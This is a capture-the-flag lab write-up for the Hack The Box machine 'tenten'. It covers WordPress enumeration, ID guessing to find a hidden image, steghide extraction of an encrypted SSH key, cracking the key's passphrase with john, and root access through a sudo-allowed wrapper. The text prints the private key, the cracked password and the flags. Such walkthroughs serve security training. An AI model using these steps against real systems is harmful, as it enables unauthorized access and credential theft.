# tenten

tenten was a relatively easy medium linux box that involved recon of the wordpress site to find a jpg file. We then run steghide on the file to get an rsa key which we extract the password from using ssh2john. We then ssh into the box as user, for root we find an intersesting file called `fuckin` which we can abuse to get comand execution and read the root flag.

> Skills involved in this box:
- enumeration
- privelage escalation
- hash cracking
- steghide

# USER

> Nmap

```shell
nmap -sC -sV -o nmap 10.10.10.10

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 09:24 EDT                                                    
Nmap scan report for 10.10.10.10                                                                                   
Host is up (0.031s latency).                                                                                       
Not shown: 998 filtered ports                                                                                      
PORT   STATE SERVICE VERSION                                                                                       
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)                                  
| ssh-hostkey:                                                                                                     
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)                                                     
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.7.3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Job Portal &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Our nmap scan reveals just 2 ports open, 22 on ssh and port 80 on http.

We head over to the website and se imeediately that it is wordpress, instead of using dirbuster or any oter reconnaisance tools we use wpscan which is made specifically for wordpress.

```shell
$ sudo wpscan -u http://10.10.10.10 
[+] We found 1 plugins:

[+] Name: job-manager - v7.2.5
 |  Latest version: 0.7.25 (up to date)
 |  Last updated: 2015-08-25T22:44:00.000Z
 |  Location: http://10.10.10.10/wp-content/plugins/job-manager/
 |  Readme: http://10.10.10.10/wp-content/plugins/job-manager/readme.txt
[+] Enumerating usernames ...
[+] Identified the following 2 user/s:
    +----+-------+-------+
    | Id | Login | Name  |
    +----+-------+-------+
    | 1  | takis | takis |
    | 2  | user1 | user1 |
    +----+-------+-------+
```

We can see that there is a user called takis on the site, we assume that this is going to be the user for this box.

Afer navigating to the http page and enumerating the website we come accross the job listings page where we click `apply` and we get an interesting url.

`http://10.10.10.10/index.php/jobs/apply/8/`


 We can see that there is the number `8` which we assume is the id of the person logged on, we test a few more numbers and we get a unique user called `HackerAccessGranted` we assume that this has to be the right thing.

 We could also get this by intercepting the request with burpsuite and sending it to intruder, we then generate a custom payload with numbers(e.g like 1-20), then take a look at the output and get the same response for number 13.

 >Exploit

 he wordpress directory structure for the uploaded files is known as /wp-content/uploads/%year%/%month%/%filename% - file structure for wordpress

We test file extensions for our wanted file and it finally  works with a `jpg` file.
```shell
wget http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```
This can also be find by fuzzing further for files or by using an exploit `CVE-2015-6668` which is a python script that bruteforces files and shows us the image file.

We then run steghide on this image to see if we can exfiltrate any hidden data inside it.

```shell
kali@kali:~/boxes/tenten$ steghide extract -sf HackerAccessGranted.jpg
Enter passphrase: 
wrote extracted data to "id_rsa".

cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C

/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
-----END RSA PRIVATE KEY-----
```
It works and it outputs to a file called id_rsa which is the ssh key for the user takis.

We try ssh into the box but the key is password protected.

```shell
kali@kali:~/boxes/tenten$ chmod 600 id_rsa
kali@kali:~/boxes/tenten$ ssh -i id_rsa takis@10.10.10.10
load pubkey "id_rsa": invalid format
Enter passphrase for key 'id_rsa': 
takis@10.10.10.10's password:
```
From here we tried `ssh2john.py` with `john` which worked great!

```shell
sudo /usr/share/john/ssh2john.py  id_rsa > hash

kali@kali:~/boxes/tenten$ sudo john -w=/home/kali/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
superpassword    (id_rsa)
1g 0:00:00:07 DONE (2020-06-22 09:41) 0.1416g/s 2031Kp/s 2031Kc/s 2031KC/sa6_123..*7¡Vamos!
Session completed
```
So now we got our password `superpassword`.

We ssh into the box and read our user flag.

```shell

kali@kali:~/boxes/tenten$ ssh -i id_rsa takis@10.10.10.10
load pubkey "id_rsa": invalid format
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
39 updates are security updates.


Last login: Fri May  5 23:05:36 2017
takis@tenten:~$ ls
user.txt
takis@tenten:~$ cat user.txt
e5c7ed3b89e73049c04c432fc8686f31
```
# ROOT

We run `sudo -l` to check if we have any privs for running things as sudo and it turns out that we do.
```shell
takis@tenten:~$ sudo -l
Matching Defaults entries for takis on tenten:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User takis may run the following commands on tenten:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/fuckin
```
we can see here that the user can run the file `fuckin` as root.

We experiment with what the file can do and we realise that we can simply specify the command after the file, we willl use this to read the root flag.
```shell
takis@tenten:~$ fuckin cat /root/root.txt
cat: /root/root.txt: Permission denied
takis@tenten:~$ fuckin id
uid=1000(takis) gid=1000(takis) groups=1000(takis),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)
takis@tenten:~$ sudo fuckin id
uid=0(root) gid=0(root) groups=0(root)
takis@tenten:~$ sudo fuckin cat /root/root.txt
f9f7291e39a9a2a011b1425c3e08f603
takis@tenten:~$ 
```
Thanks for reading hope you enjoyed!
